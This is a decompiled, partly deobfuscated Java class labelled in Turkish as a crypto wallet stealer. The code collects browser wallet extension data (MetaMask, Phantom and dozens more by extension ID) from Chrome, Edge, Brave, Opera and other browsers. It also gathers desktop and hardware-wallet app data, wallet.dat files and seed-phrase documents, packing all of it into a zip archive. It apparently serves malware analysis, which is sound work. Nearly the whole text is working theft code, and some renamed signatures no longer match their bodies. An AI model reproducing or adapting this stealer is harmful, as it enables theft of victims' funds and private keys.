/*\n * ========================================\n * DEOBFUSCATED: WalletStealer.java\n * Original: b/d.java\n * ----------------------------------------\n * Kripto cüzdan hırsızı - Browser/Desktop/Cold wallet tarama (512 satır)\n * ========================================\n */\n\n/*
 * Decompiled with CFR 0.152.
 */
package b;

import b.b;
import b.f;
import c.c;
import c.r;
import java.io.File;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.regex.Pattern;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import org.apache.commons.io.FileUtils;

public final class d
extends b {
    public static final d INSTANCE = new d();
    public int browserWalletCount = 0;
    public int desktopWalletCount = 0;
    public int totalExtensions = 0;
    public int totalFiles = 0;
    public int skippedFiles = 0;
    public final List<String> g = new ArrayList<String>();
    private static final long MAX_WALLET_SIZE = 0x500000L;
    private static final long i = 0x1400000L;
    private static final long j = 0xA00000L;
    private static final long k = 0x100000L;
    private static final String[] l = new String[]{"Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"};
    private static final Pattern[] m = new Pattern[]{Pattern.compile("seed", 2), Pattern.compile("mnemonic", 2), Pattern.compile("recovery.*phrase", 2), Pattern.compile("private.*key", 2), Pattern.compile("wallet.*backup", 2), Pattern.compile("crypto.*backup", 2)};
    private static final Pattern[] n = new Pattern[]{Pattern.compile("discord", 2), Pattern.compile("backup.*codes", 2)};

    public void scanBrowserExtensions(ZipOutputStream zipOutputStream) {
        this.b = 0;
        this.c = 0;
        this.d = 0;
        this.e = 0;
        this.f = 0;
        this.g.clear();
        String string = System.getenv("LOCALAPPDATA");
        String string2 = System.getenv("APPDATA");
        if (string == null) {
            string = "";
        }
        if (string2 == null) {
            string2 = "";
        }
        try {
            this.a(zipOutputStream, string, string2);
        }
        catch (Throwable throwable) {
            c.c.logEvent("browser wallets failed: " + throwable.getMessage());
        }
        try {
            this.b(zipOutputStream, string, string2);
        }
        catch (Throwable throwable) {
            c.c.logEvent("desktop wallets failed: " + throwable.getMessage());
        }
        try {
            this.a(zipOutputStream, string2);
        }
        catch (Throwable throwable) {
            c.c.logEvent("cold wallets failed: " + throwable.getMessage());
        }
        try {
            this.b(zipOutputStream, string2);
        }
        catch (Throwable throwable) {
            c.c.logEvent("wallet.dat failed: " + throwable.getMessage());
        }
        try {
            this.c(zipOutputStream);
        }
        catch (Throwable throwable) {
            c.c.logEvent("seed files failed: " + throwable.getMessage());
        }
        try {
            String string3 = this.b();
            if (!string3.isEmpty()) {
                b.d.a(zipOutputStream, "AllWallets/wallet_summary.txt", string3.getBytes(StandardCharsets.UTF_8));
            }
        }
        catch (Throwable throwable) {
            // empty catch block
        }
        c.c.logEvent("wallets: browser=" + this.b + " desktop=" + this.c + " cold=" + this.d + " dat=" + this.e + " seed=" + this.f);
    }

    public int getWalletCount() {
        return this.b + this.c + this.d + this.e + this.f;
    }

    private void stealWallets(ZipOutputStream zipOutputStream, String string, String string2) {
        Map<String, f> map = b.d.a(string, string2);
        for (Map.Entry<String, f> entry : map.entrySet()) {
            String string3 = entry.getKey();
            f f2 = entry.getValue();
            File file = new File(f2.a);
            if (!file.isDirectory()) continue;
            for (String string4 : l) {
                File file2 = new File(file, string4);
                File file3 = new File(file2, "Local Extension Settings");
                if (!file3.isDirectory()) continue;
                for (Map.Entry<String, String> entry2 : f2.b.entrySet()) {
                    String string5 = entry2.getKey();
                    String string6 = entry2.getValue();
                    File file4 = new File(file3, string6);
                    if (!file4.isDirectory()) continue;
                    String string7 = b.d.a(string3 + "_" + string4 + "_" + string5);
                    String string8 = "AllWallets/Browser_Wallets/" + string7 + "/";
                    long l2 = 0L;
                    int n2 = 0;
                    File[] fileArray = file4.listFiles();
                    if (fileArray == null) continue;
                    StringBuilder stringBuilder = new StringBuilder();
                    stringBuilder.append("browser=").append(string3).append('\n');
                    stringBuilder.append("profile=").append(string4).append('\n');
                    stringBuilder.append("wallet=").append(string5).append('\n');
                    stringBuilder.append("extensionId=").append(string6).append('\n');
                    stringBuilder.append("path=").append(file4.getAbsolutePath()).append('\n');
                    for (File file5 : fileArray) {
                        long l3;
                        if (!file5.isFile() || (l3 = file5.length()) <= 0L || l3 > 0x500000L) continue;
                        if (l2 + l3 > 0x1400000L) break;
                        try {
                            byte[] byArray = FileUtils.readFileToByteArray(file5);
                            b.d.a(zipOutputStream, string8 + file5.getName(), byArray);
                            l2 += l3;
                            ++n2;
                            stringBuilder.append("file=").append(file5.getName()).append(" size=").append(l3).append('\n');
                        }
                        catch (Exception exception) {
                            // empty catch block
                        }
                    }
                    if (n2 <= 0) continue;
                    try {
                        b.d.a(zipOutputStream, string8 + "info.txt", stringBuilder.toString().getBytes(StandardCharsets.UTF_8));
                    }
                    catch (Exception exception) {
                        // empty catch block
                    }
                    ++this.b;
                    this.g.add(string5 + " (" + string3 + ")");
                }
            }
        }
    }

    private void scanBrowserWallets(ZipOutputStream zipOutputStream, String string, String string2) {
        LinkedHashMap<String, String> linkedHashMap = new LinkedHashMap<String, String>();
        linkedHashMap.put("Exodus", b.d.a(string2, "Exodus", "exodus.wallet"));
        linkedHashMap.put("Atomic", b.d.a(string2, "atomic", "Local Storage", "leveldb"));
        linkedHashMap.put("Electrum", b.d.a(string2, "Electrum", "wallets"));
        linkedHashMap.put("Ethereum", b.d.a(string2, "Ethereum", "keystore"));
        linkedHashMap.put("Monero", b.d.a(string2, new String[]{"Monero"}));
        linkedHashMap.put("Bytecoin", b.d.a(string2, new String[]{"bytecoin"}));
        linkedHashMap.put("Jaxx Liberty", b.d.a(string2, "com.liberty.jaxx", "IndexedDB"));
        linkedHashMap.put("Zcash", b.d.a(string2, new String[]{"Zcash"}));
        linkedHashMap.put("Armory", b.d.a(string2, new String[]{"Armory"}));
        linkedHashMap.put("Coinomi", b.d.a(string, "Coinomi", "Coinomi", "wallets"));
        linkedHashMap.put("Guarda", b.d.a(string2, new String[]{"Guarda"}));
        linkedHashMap.put("Wasabi", b.d.a(string2, "WalletWasabi", "Client", "Wallets"));
        linkedHashMap.put("Bitcoin Core", b.d.a(string2, "Bitcoin", "wallets"));
        linkedHashMap.put("Bitcoin", b.d.a(string2, new String[]{"Bitcoin"}));
        linkedHashMap.put("Litecoin", b.d.a(string2, new String[]{"Litecoin"}));
        linkedHashMap.put("Litecoin Core", b.d.a(string2, "Litecoin", "wallets"));
        linkedHashMap.put("Dash Core", b.d.a(string2, "DashCore", "wallets"));
        linkedHashMap.put("Dash", b.d.a(string2, new String[]{"DashCore"}));
        linkedHashMap.put("Dogecoin", b.d.a(string2, new String[]{"Dogecoin"}));
        linkedHashMap.put("Dogecoin Core", b.d.a(string2, "Dogecoin", "wallets"));
        linkedHashMap.put("Daedalus", b.d.a(string2, "Daedalus", "wallets"));
        linkedHashMap.put("Yoroi", b.d.a(string2, new String[]{"Yoroi"}));
        linkedHashMap.put("Nami", b.d.a(string2, new String[]{"Nami"}));
        linkedHashMap.put("Eternl", b.d.a(string2, new String[]{"eternl"}));
        linkedHashMap.put("MultiBit", b.d.a(string2, new String[]{"MultiBit"}));
        linkedHashMap.put("Binance", b.d.a(string2, new String[]{"Binance"}));
        linkedHashMap.put("com.liberty.jaxx", b.d.a(string2, "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb"));
        for (Map.Entry entry : linkedHashMap.entrySet()) {
            int n2;
            String string3 = (String)entry.getKey();
            File file = new File((String)entry.getValue());
            String string4 = "AllWallets/Desktop_Wallets/" + b.d.a(string3) + "/";
            if (!file.exists() || (n2 = this.a(zipOutputStream, file, string4, 70, 2)) <= 0) continue;
            ++this.c;
            this.g.add(string3);
            try {
                String string5 = "name=" + string3 + "\npath=" + file.getAbsolutePath() + "\ntype=" + (file.isDirectory() ? "directory" : "file") + "\nfiles=" + n2 + "\n";
                b.d.a(zipOutputStream, string4 + "info.txt", string5.getBytes(StandardCharsets.UTF_8));
            }
            catch (Exception exception) {}
        }
    }

    private void scanExtensionDir(ZipOutputStream zip, String browserPath) {
        LinkedHashMap<String, String> linkedHashMap = new LinkedHashMap<String, String>();
        linkedHashMap.put("Ledger Live", b.d.a(string, new String[]{"Ledger Live"}));
        linkedHashMap.put("Ledger", b.d.a(string, "Ledger Live", "Local Storage", "leveldb"));
        linkedHashMap.put("Trezor Suite", b.d.a(string, new String[]{"Trezor Suite"}));
        linkedHashMap.put("Trezor", b.d.a(string, "Trezor Suite", "IndexedDB"));
        linkedHashMap.put("KeepKey", b.d.a(string, new String[]{"KeepKey"}));
        linkedHashMap.put("BitBox", b.d.a(string, new String[]{"BitBox"}));
        for (Map.Entry entry : linkedHashMap.entrySet()) {
            int n2;
            String string2 = (String)entry.getKey();
            File file = new File((String)entry.getValue());
            String string3 = "AllWallets/Cold_Wallets/" + b.d.a(string2) + "/";
            if (!file.exists() || (n2 = this.a(zipOutputStream, file, string3, 50, 2)) <= 0) continue;
            ++this.d;
            this.g.add(string2);
            try {
                String string4 = "name=" + string2 + "\npath=" + file.getAbsolutePath() + "\nfiles=" + n2 + "\n";
                b.d.a(zipOutputStream, string3 + "info.txt", string4.getBytes(StandardCharsets.UTF_8));
            }
            catch (Exception exception) {}
        }
    }

    private void scanColdWalletDir(ZipOutputStream zip, String walletPath) {
        String[] stringArray = new String[]{b.d.a(string, new String[]{"Bitcoin"}), b.d.a(string, new String[]{"Litecoin"}), b.d.a(string, new String[]{"Dogecoin"}), b.d.a(string, new String[]{"DashCore"}), b.d.a(string, new String[]{"Ethereum"}), b.d.a(string, new String[]{"Monero"})};
        int n2 = 0;
        for (String string2 : stringArray) {
            File file = new File(string2);
            if (!file.isDirectory()) continue;
            ArrayList<File> arrayList = new ArrayList<File>();
            b.d.a(file, "wallet.dat", arrayList, 0, 2);
            for (File file2 : arrayList) {
                try {
                    String string3 = file2.getParentFile() != null ? file2.getParentFile().getName() : "unknown";
                    String string4 = "wallet_" + ++n2 + "_" + b.d.a(string3) + ".dat";
                    byte[] byArray = FileUtils.readFileToByteArray(file2);
                    b.d.a(zipOutputStream, "AllWallets/WalletDat_Files/" + string4, byArray);
                    ++this.e;
                    this.g.add("wallet.dat (" + string3 + ")");
                }
                catch (Exception exception) {}
            }
        }
    }

    private void scanDesktopWallets(ZipOutputStream zipOutputStream) {
        String string = System.getProperty("user.home");
        if (string == null || string.isEmpty()) {
            return;
        }
        ArrayList<File> arrayList = new ArrayList<File>();
        arrayList.add(new File(string, "Desktop"));
        arrayList.add(new File(string, "Documents"));
        arrayList.add(new File(string, "Downloads"));
        arrayList.add(new File(string, "OneDrive\\Desktop"));
        arrayList.add(new File(string, "OneDrive\\Documents"));
        int n2 = 0;
        LinkedHashSet<String> linkedHashSet = new LinkedHashSet<String>();
        for (File file : arrayList) {
            if (!file.isDirectory()) continue;
            ArrayList<File> arrayList2 = new ArrayList<File>();
            b.d.a(file, null, arrayList2, 0, 1);
            for (File file2 : arrayList2) {
                if (n2 >= 30) {
                    return;
                }
                String string2 = file2.getName().toLowerCase(Locale.ROOT);
                if (!string2.endsWith(".txt") && !string2.endsWith(".doc") && !string2.endsWith(".docx") && !string2.endsWith(".csv") || file2.length() <= 0L || file2.length() > 0x100000L) continue;
                boolean bl = false;
                for (Pattern pattern : n) {
                    if (!pattern.matcher(string2).find()) continue;
                    bl = true;
                    break;
                }
                if (bl) continue;
                boolean bl2 = false;
                for (Pattern pattern : m) {
                    if (!pattern.matcher(string2).find()) continue;
                    bl2 = true;
                    break;
                }
                if (!bl2 || !linkedHashSet.add(file2.getAbsolutePath().toLowerCase(Locale.ROOT))) continue;
                try {
                    byte[] exception = FileUtils.readFileToByteArray(file2);
                    String string3 = "AllWallets/Seed_Phrases/" + b.d.a(file.getName()) + "/" + file2.getName();
                    b.d.a(zipOutputStream, string3, exception);
                    ++this.f;
                    this.g.add(file2.getName());
                    ++n2;
                }
                catch (Exception exception) {}
            }
        }
    }

    private int addWalletFiles(ZipOutputStream zip, File dir, String prefix, int depth, int maxDepth) {
        int n4 = 0;
        try {
            if (file.isFile()) {
                if (file.length() > 0L && file.length() <= 0xA00000L) {
                    b.d.a(zipOutputStream, string + file.getName(), FileUtils.readFileToByteArray(file));
                    return 1;
                }
                return 0;
            }
            if (!file.isDirectory()) {
                return 0;
            }
            ArrayList<File> arrayList = new ArrayList<File>();
            b.d.a(file, null, arrayList, 0, n3);
            int n5 = Math.min(arrayList.size(), n2);
            for (int i2 = 0; i2 < n5; ++i2) {
                File file2 = (File)arrayList.get(i2);
                if (!file2.isFile() || file2.length() <= 0L || file2.length() > 0xA00000L) continue;
                try {
                    String string2 = b.d.a(file, file2);
                    b.d.a(zipOutputStream, string + string2.replace('\\', '/'), FileUtils.readFileToByteArray(file2));
                    ++n4;
                    continue;
                }
                catch (Exception exception) {
                    // empty catch block
                }
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        return n4;
    }

    private static void findWalletFiles(File dir, String pattern, List<File> results, int depth, int maxDepth) {
        if (n2 > n3 || file == null || !file.isDirectory()) {
            return;
        }
        File[] fileArray = file.listFiles();
        if (fileArray == null) {
            return;
        }
        for (File file2 : fileArray) {
            String string2 = file2.getName();
            if ("node_modules".equalsIgnoreCase(string2) || ".git".equalsIgnoreCase(string2) || "cache".equalsIgnoreCase(string2) || "Cache".equals(string2)) continue;
            try {
                if (file2.isDirectory()) {
                    b.d.a(file2, string, list, n2 + 1, n3);
                    continue;
                }
                if (string != null && !string2.equalsIgnoreCase(string)) continue;
                list.add(file2);
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
    }

    private String getBrowserWalletPath() {
        if (this.a() == 0) {
            return "";
        }
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append("WALLET SUMMARY\n");
        stringBuilder.append("==============================\n\n");
        stringBuilder.append("Browser Wallets: ").append(this.b).append('\n');
        stringBuilder.append("Desktop Wallets: ").append(this.c).append('\n');
        stringBuilder.append("Cold Wallets: ").append(this.d).append('\n');
        stringBuilder.append("Wallet.dat Files: ").append(this.e).append('\n');
        stringBuilder.append("Seed Files: ").append(this.f).append('\n');
        stringBuilder.append("Total: ").append(this.a()).append("\n\n");
        if (!this.g.isEmpty()) {
            stringBuilder.append("Found:\n");
            int n2 = 1;
            for (String string : this.g) {
                stringBuilder.append(n2++).append(". ").append(string).append('\n');
            }
        }
        return stringBuilder.toString();
    }

    private static void addZipEntry(ZipOutputStream zip, String entryName, byte[] data) throws Exception {
        zipOutputStream.putNextEntry(new ZipEntry(string));
        zipOutputStream.write(byArray);
        zipOutputStream.closeEntry();
    }

    private static String normalizePath(String path) {
        if (string == null) {
            return "unknown";
        }
        return string.replaceAll("[<>:\"/\\\\|?*]", "_").trim();
    }

    private static String joinPaths(String base, String ... parts) {
        File file = new File(string == null ? "" : string);
        for (String string2 : stringArray) {
            file = new File(file, string2);
        }
        return file.getAbsolutePath();
    }

    private static String relativize(File base, File target) {
        try {
            return file.toPath().relativize(file2.toPath()).toString();
        }
        catch (Exception exception) {
            return file2.getName();
        }
    }

    private static Map<String, f> discoverBrowserProfiles(String dataDir, String walletDir) {
        LinkedHashMap<String, f> linkedHashMap = new LinkedHashMap<String, f>();
        f f2 = new f(string + "\\Google\\Chrome" /* r.gc() */ + "\\User Data" /* r.ud() */);
        b.d.a(f2.b);
        f2.b.put("MetaMask", "nkbihfbeogaeaoehlefnkodbefgpgknn");
        f2.b.put("Brave Wallet", "odbfpeeihdkbihmopkbjmoonfanlbfcl");
        linkedHashMap.put("Chrome", f2);
        f f3 = new f(string + "\\Microsoft\\Edge" /* r.me() */ + "\\User Data" /* r.ud() */);
        f3.b.put("MetaMask", "ejbalbakoplchlghecdalmeeeajnimhm");
        f3.b.put("Phantom", "bfnaelmomeimhlpmgjnjophhpkkoljpa");
        f3.b.put("Coinbase Wallet", "hnfanknocfeofbddgcijnmhnfnkdnaad");
        f3.b.put("Binance Wallet", "fhbohimaelbohpjbbldcngcnapndodjp");
        f3.b.put("Trust Wallet", "egjidjbpglichdcondbcbdnbeeppgdph");
        linkedHashMap.put("Edge", f3);
        f f4 = new f(string + "\\BraveSoftware\\Brave-Browser" /* r.bb() */ + "\\User Data" /* r.ud() */);
        f4.b.put("MetaMask", "nkbihfbeogaeaoehlefnkodbefgpgknn");
        f4.b.put("Phantom", "bfnaelmomeimhlpmgjnjophhpkkoljpa");
        f4.b.put("Coinbase Wallet", "hnfanknocfeofbddgcijnmhnfnkdnaad");
        linkedHashMap.put("Brave", f4);
        f f5 = new f(string2 + "\\Opera Software\\Opera Stable" /* r.os() */);
        b.d.a(f5.b);
        linkedHashMap.put("Opera", f5);
        f f6 = new f(string2 + r.path(new int[]{25, 10, 53, 32, 55, 36, 101, 22, 42, 35, 49, 50, 36, 55, 32, 25, 10, 53, 32, 55, 36, 101, 2, 29, 101, 22, 49, 36, 39, 41, 32}, 69));
        b.d.a(f6.b);
        linkedHashMap.put("OperaGX", f6);
        f f7 = new f(string2 + r.path(new int[]{27, 8, 55, 34, 53, 38, 103, 20, 40, 33, 51, 48, 38, 53, 34, 27, 8, 55, 34, 53, 38, 103, 4, 53, 62, 55, 51, 40, 103, 20, 51, 38, 37, 43, 34}, 71));
        b.d.a(f7.b);
        linkedHashMap.put("OperaCrypto", f7);
        f f8 = new f(string2 + r.path(new int[]{21, 6, 57, 44, 59, 40, 105, 26, 38, 47, 61, 62, 40, 59, 44, 21, 6, 57, 44, 59, 40, 105, 13, 44, 63, 44, 37, 38, 57, 44, 59}, 73));
        b.d.a(f8.b);
        linkedHashMap.put("OperaDeveloper", f8);
        f f9 = new f(string2 + r.path(new int[]{17, 2, 61, 40, 63, 44, 109, 30, 34, 43, 57, 58, 44, 63, 40, 17, 2, 61, 40, 63, 44, 109, 2, 35, 40}, 77));
        b.d.a(f9.b);
        linkedHashMap.put("OperaOne", f9);
        f f10 = new f(string + r.path(new int[]{221, 213, 233, 228, 161, 195, 243, 238, 246, 242, 228, 243, 161, 194, 238, 236, 241, 224, 239, 248, 221, 192, 243, 226}, 129) + "\\User Data" /* r.ud() */);
        b.d.a(f10.b);
        linkedHashMap.put("Arc", f10);
        f f11 = new f(string + r.path(new int[]{19, 25, 38, 57, 46, 35, 43, 38}, 79) + "\\User Data" /* r.ud() */);
        b.d.a(f11.b);
        linkedHashMap.put("Vivaldi", f11);
        f f12 = new f(string + r.path(new int[]{13, 8, 48, 63, 53, 52, 41, 13, 8, 48, 63, 53, 52, 41, 19, 35, 62, 38, 34, 52, 35}, 81) + "\\User Data" /* r.ud() */);
        b.d.a(f12.b);
        linkedHashMap.put("Yandex", f12);
        return linkedHashMap;
    }

    private static void populateWalletExtensions(Map<String, String> map) {
        map.put("MetaMask", "nkbihfbeogaeaoehlefnkodbefgpgknn");
        map.put("Phantom", "bfnaelmomeimhlpmgjnjophhpkkoljpa");
        map.put("Coinbase Wallet", "hnfanknocfeofbddgcijnmhnfnkdnaad");
        map.put("Binance Wallet", "fhbohimaelbohpjbbldcngcnapndodjp");
        map.put("Trust Wallet", "egjidjbpglichdcondbcbdnbeeppgdph");
        map.put("Exodus", "aholpfdialjgjfhomihkjbmgjidlcdno");
        map.put("Atomic Wallet", "fhilaheimglignddkjgofkcbgekhenbh");
        map.put("Math Wallet", "afbcbjpbpfadlkmhmclhkeeodmamcflc");
        map.put("BitKeep", "jiidiaalihmmhddjgbnbgdfflelocpak");
        map.put("OKX Wallet", "mcohilncbfahbmgdjkbpemcciiolgcge");
        map.put("Rabby Wallet", "acmacodkjbdgmoleebolmdjonilkdbch");
        map.put("XDEFI Wallet", "hmeobnfnfcmdkdcmlblgagmfpfboieaf");
        map.put("SafePal", "lgmpcpglpngdoalbgeoldeajfclnhafa");
        map.put("Keplr", "dmkamcknogkgcdfhhbddcghachkejeap");
        map.put("Terra Station", "aiifbnbfobpmeekipheeijimdpnlpgpp");
        map.put("Nami", "lpfcbjknijpeeillifnkikgncikgfhdo");
        map.put("Eternl", "kmhcihpebfmpgmihbkipmjlmmioameka");
        map.put("Yoroi", "ffnbelfdoeiohenkjibnmadjiehjhajb");
        map.put("TronLink", "ibnejdfjmmkpcnlpebklmnkoeoihofec");
        map.put("Ronin Wallet", "fnjhmkhhmkbjkkabndcnnogagogbneec");
        map.put("Liquality", "kpfopkelmapcoipemfendmdcghnegimn");
        map.put("Solflare", "bhhhlbepdkbapadjdnnojkbgioiodbic");
        map.put("Slope", "pocmplpaccanhmnllbbkpgfliimjljgo");
        map.put("Braavos", "jnlgamecbpmbajjfhmmmlhejkemejdma");
        map.put("Guarda", "hpglfhgfnhbgpjdenjgmdgoeiappafln");
        map.put("Leather (Hiro)", "ldinpeekobnhjjdofggfgjlcehhmanlj");
        map.put("Sui Wallet", "opcgpfmipidbgpenhmajoajpbobppdil");
        map.put("Petra Aptos", "ejjladinnckdgjemekebdpeokbikhfci");
        map.put("Martian Aptos", "efbglgofoippbgcjepnhiblaibcnclgk");
        map.put("Pontem Aptos", "phkbamefinggmakgklpkljjmgibohnba");
        map.put("Sender Wallet", "epapihdplajcdnnkdeiahlgigofloibg");
        map.put("Leap Cosmos", "fcfcfllfndlomdhbehjjcoimbgofdncg");
        map.put("Core", "agoakfejjabomempkjlepdflaleeobhb");
        map.put("Enkrypt", "kkpllkodjeloidieedojogacfhpaihoh");
        map.put("Rainbow", "opfgelmcmbiajamepnmloijbpoleiama");
        map.put("Zerion", "klghhnkeealcohjjanjjdaeeggmfmlpl");
        map.put("Talisman", "fijngjgcjhjmmpcmkeiomlglpeiijkld");
        map.put("Backpack", "aflkmfhebedbjioipglgcbcmnbpgliof");
        map.put("SubWallet", "onhogfjeacnfoofkfgppdlbmlmnplgbn");
        map.put("PolkadotJS", "mopnmbcafieddcagagdcbnhejhlodfdd");
        map.put("Cosmostation", "fpkhgmpbidmiogeglndfbkegfdlnajnf");
        map.put("Temple", "ookjlbkiijinhpmnjffcofjonbfbgaoc");
        map.put("OneKey", "jnmbobjmhlngoefaiojfljckilhhlhcj");
        map.put("Coin98", "aeachknmefphepccionboohckonoeemg");
        map.put("TokenPocket", "mfgccjchihfkkindfppnaooecgfneiii");
        map.put("Taho (Tally Ho)", "eajafomhmkipbjmfmhebemolkcicgfmd");
        map.put("Xverse", "idnnbdplmphpflfnlkomgpfbpcgelopg");
        map.put("Flint Wallet", "hnhobjmcibchnmglfbldbfabcgaknlkj");
        map.put("Maiar DeFi", "dngmlblcodfobpdpecaadgfbcggfjfnm");
    }
}

